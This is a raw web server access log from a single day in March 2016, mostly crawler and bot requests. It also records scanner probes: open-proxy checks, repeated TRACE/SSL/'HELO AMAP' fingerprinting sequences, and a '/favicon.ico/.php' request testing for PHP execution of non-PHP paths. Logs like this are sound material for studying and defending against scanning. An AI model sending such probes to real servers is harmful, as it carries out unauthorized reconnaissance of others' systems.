178.63.100.85 - - [02/Mar/2016:12:29:09 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:10 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:10 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:11 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:11 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:12 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:12 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:13 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36"
178.63.100.85 - - [02/Mar/2016:12:29:14 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25"
178.63.100.85 - - [02/Mar/2016:12:29:14 +0800] "GET / HTTP/1.0" 403 4961 "http://imgur.com/yXP64st" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25"
172.82.166.210 - - [02/Mar/2016:12:31:16 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 300 "-" "Mozilla"
148.251.136.43 - - [02/Mar/2016:12:34:11 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
40.77.167.37 - - [02/Mar/2016:12:41:43 +0800] "GET /kaoshi/JAVA/20150521_39381.html HTTP/1.1" 404 307 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
148.251.136.43 - - [02/Mar/2016:12:45:08 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:12:56:15 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
2.187.253.17 - - [02/Mar/2016:12:57:38 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)"
2.187.253.17 - - [02/Mar/2016:12:57:39 +0800] "GET /html/javascript/2014_09/1729.html HTTP/1.1" 404 309 "-" "Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)"
148.251.136.43 - - [02/Mar/2016:13:06:51 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.81 - - [02/Mar/2016:13:14:31 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.89 - - [02/Mar/2016:13:17:00 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:13:17:21 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:13:28:59 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:13:39:16 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:13:50:41 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:14:01:41 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:14:12:24 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.86 - - [02/Mar/2016:14:14:38 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.89 - - [02/Mar/2016:14:18:12 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:14:23:11 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:14:44:21 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:14:55:22 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
69.61.12.70 - - [02/Mar/2016:14:58:13 +0800] "GET / HTTP/1.1" 403 4961 "" "Mozilla/5.0 CommonCrawler Node AJCCHSIITISSHSU5L3RO6BXZISYNKCNTVA45U6FRU2A6CK7DCHGNHZVFGH5PQBL.W4AO3FX5C.CB7ICJ57ZNMFZLAJ3MBHPML34RJMWNTMXMVLOD6WCD5RKBVQ.cdn0.common.crawl.zone"
148.251.136.43 - - [02/Mar/2016:14:58:21 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:15:01:22 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:15:06:43 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:15:09:38 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.75 - - [02/Mar/2016:15:13:38 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.112 - - [02/Mar/2016:15:16:26 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:15:20:10 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:15:30:55 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:15:41:55 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:15:52:58 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:16:04:04 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:16:14:24 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.100 - - [02/Mar/2016:16:16:32 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:16:24:48 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:16:34:56 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:16:46:06 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
134.96.225.202 - - [02/Mar/2016:16:51:09 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 Google-HTTP-Java-Client/1.20.0 (gzip)"
134.96.225.202 - - [02/Mar/2016:16:51:10 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 Google-HTTP-Java-Client/1.20.0 (gzip)"
95.213.187.187 - - [02/Mar/2016:16:55:23 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 313 "-" "-"
148.251.136.43 - - [02/Mar/2016:16:56:20 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:17:06:46 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.107 - - [02/Mar/2016:17:12:50 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.116 - - [02/Mar/2016:17:16:40 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:17:17:46 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:17:27:57 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:17:38:47 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:17:49:10 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:17:59:50 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
106.185.47.161 - - [02/Mar/2016:18:07:28 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 300 "-" "Mozilla"
148.251.136.43 - - [02/Mar/2016:18:10:39 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.75 - - [02/Mar/2016:18:14:03 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
103.41.53.252 - - [02/Mar/2016:18:14:54 +0800] "GET http://wenku.baidu.com/ HTTP/1.1" 403 4961 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
220.181.108.77 - - [02/Mar/2016:18:17:22 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:18:21:23 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:18:31:40 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:18:41:59 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
101.201.232.6 - - [02/Mar/2016:18:44:49 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
101.201.232.6 - - [02/Mar/2016:18:44:52 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
208.184.112.74 - - [02/Mar/2016:18:44:52 +0800] "GET / HTTP/1.1" 403 4961 "http://www.bing.com" "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"
101.201.232.6 - - [02/Mar/2016:18:44:54 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
101.201.232.6 - - [02/Mar/2016:18:44:56 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
101.201.232.6 - - [02/Mar/2016:18:44:58 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
46.165.220.207 - - [02/Mar/2016:18:45:30 +0800] "GET / HTTP/1.1" 403 4961 "http://zixuephp.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
101.201.232.6 - - [02/Mar/2016:18:45:38 +0800] "HELO AMAP" 400 301 "-" "-"
101.201.232.6 - - [02/Mar/2016:18:45:40 +0800] "USER AMAP" 400 301 "-" "-"
101.201.232.6 - - [02/Mar/2016:18:46:28 +0800] "" 501 277 "-" "-"
101.201.232.6 - - [02/Mar/2016:18:46:50 +0800] "< NTP/1.2 >" 400 301 "-" "-"
169.229.3.91 - - [02/Mar/2016:18:47:05 +0800] "\xb7S\x1c\x05H\xac\xe3\xfa\xa78" 501 287 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:06 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:08 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:11 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:13 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:16 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:54 +0800] "HELO AMAP" 400 301 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:56:57 +0800] "USER AMAP" 400 301 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:57:43 +0800] "" 501 277 "-" "-"
112.74.176.8 - - [02/Mar/2016:18:58:07 +0800] "< NTP/1.2 >" 400 301 "-" "-"
61.190.254.7 - - [02/Mar/2016:18:58:54 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
61.190.254.7 - - [02/Mar/2016:18:58:57 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
61.190.254.7 - - [02/Mar/2016:18:58:59 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
61.190.254.7 - - [02/Mar/2016:18:59:01 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
61.190.254.7 - - [02/Mar/2016:18:59:03 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
61.190.254.7 - - [02/Mar/2016:18:59:38 +0800] "HELO AMAP" 400 301 "-" "-"
61.190.254.7 - - [02/Mar/2016:18:59:40 +0800] "USER AMAP" 400 301 "-" "-"
61.190.254.7 - - [02/Mar/2016:19:00:22 +0800] "" 501 277 "-" "-"
61.190.254.7 - - [02/Mar/2016:19:00:43 +0800] "< NTP/1.2 >" 400 301 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:00 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:03 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:05 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:07 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:09 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:47 +0800] "HELO AMAP" 400 301 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:03:49 +0800] "USER AMAP" 400 301 "-" "-"
150.70.173.46 - - [02/Mar/2016:19:04:12 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
101.201.232.5 - - [02/Mar/2016:19:04:35 +0800] "" 501 277 "-" "-"
101.201.232.5 - - [02/Mar/2016:19:04:57 +0800] "< NTP/1.2 >" 400 301 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:14 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:16 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:18 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:19 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:20 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:58 +0800] "HELO AMAP" 400 301 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:07:59 +0800] "USER AMAP" 400 301 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:08:44 +0800] "" 501 277 "-" "-"
121.196.208.11 - - [02/Mar/2016:19:09:04 +0800] "< NTP/1.2 >" 400 301 "-" "-"
148.251.136.43 - - [02/Mar/2016:19:12:59 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.78 - - [02/Mar/2016:19:13:36 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.101 - - [02/Mar/2016:19:17:00 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
112.74.32.25 - - [02/Mar/2016:19:21:06 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:21:08 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
112.74.32.25 - - [02/Mar/2016:19:21:10 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:21:12 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:21:15 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:21:57 +0800] "HELO AMAP" 400 301 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:21:59 +0800] "USER AMAP" 400 301 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:22:50 +0800] "" 501 277 "-" "-"
112.74.32.25 - - [02/Mar/2016:19:23:18 +0800] "< NTP/1.2 >" 400 301 "-" "-"
148.251.136.43 - - [02/Mar/2016:19:23:22 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:19:34:05 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:19:44:20 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:19:54:53 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
222.189.49.146 - - [02/Mar/2016:19:59:04 +0800] "/" 501 278 "-" "-"
148.251.136.43 - - [02/Mar/2016:20:05:41 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.86 - - [02/Mar/2016:20:15:04 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:20:15:59 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.94 - - [02/Mar/2016:20:17:19 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:20:26:37 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
107.150.42.36 - - [02/Mar/2016:20:35:00 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
148.251.136.43 - - [02/Mar/2016:20:37:49 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
190.123.46.11 - - [02/Mar/2016:20:42:42 +0800] "GET /favicon.ico/.php HTTP/1.1" 404 292 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
148.251.136.43 - - [02/Mar/2016:20:48:45 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
121.196.208.65 - - [02/Mar/2016:20:49:52 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:49:54 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
121.196.208.65 - - [02/Mar/2016:20:49:56 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:49:57 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:49:58 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:50:29 +0800] "HELO AMAP" 400 301 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:50:31 +0800] "USER AMAP" 400 301 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:51:08 +0800] "" 501 277 "-" "-"
121.196.208.65 - - [02/Mar/2016:20:51:25 +0800] "< NTP/1.2 >" 400 301 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:24 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:34 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:42 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:42 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:46 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:56 +0800] "HELO AMAP" 400 301 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:53:57 +0800] "USER AMAP" 400 301 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:54:02 +0800] "" 501 277 "-" "-"
120.24.54.198 - - [02/Mar/2016:20:54:04 +0800] "< NTP/1.2 >" 400 301 "-" "-"
148.251.136.43 - - [02/Mar/2016:20:59:13 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
69.61.12.70 - - [02/Mar/2016:21:01:44 +0800] "GET / HTTP/1.1" 403 4961 "" "Mozilla/5.0 CommonCrawler Node CQJTTPYDAC4LFA2K2BMIUSKF5I446PHUECBSRPSWPOCQC6G47QAJ65IE7HAHJ3A.EYWPN3JYC.3ZLH2ZUHMPKXN3ZQONBACTMDPTHNRMXPKXARQEW76JOLOES2.cdn0.common.crawl.zone"
83.6.252.179 - - [02/Mar/2016:21:05:58 +0800] "GET / HTTP/1.0" 403 4961 "http://zixuephp.com/" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
83.6.252.179 - - [02/Mar/2016:21:05:59 +0800] "GET / HTTP/1.0" 403 4961 "http://zixuephp.com/" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
83.6.252.179 - - [02/Mar/2016:21:06:00 +0800] "GET / HTTP/1.0" 403 4961 "http://zixuephp.com/" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
83.6.252.179 - - [02/Mar/2016:21:06:01 +0800] "GET / HTTP/1.0" 403 4961 "http://zixuephp.com/" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
121.196.208.45 - - [02/Mar/2016:21:07:13 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:07:16 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
121.196.208.45 - - [02/Mar/2016:21:07:18 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:07:20 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:07:23 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:07:59 +0800] "HELO AMAP" 400 301 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:08:02 +0800] "USER AMAP" 400 301 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:08:47 +0800] "" 501 277 "-" "-"
121.196.208.45 - - [02/Mar/2016:21:09:08 +0800] "< NTP/1.2 >" 400 301 "-" "-"
148.251.136.43 - - [02/Mar/2016:21:10:28 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
112.74.176.9 - - [02/Mar/2016:21:11:17 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
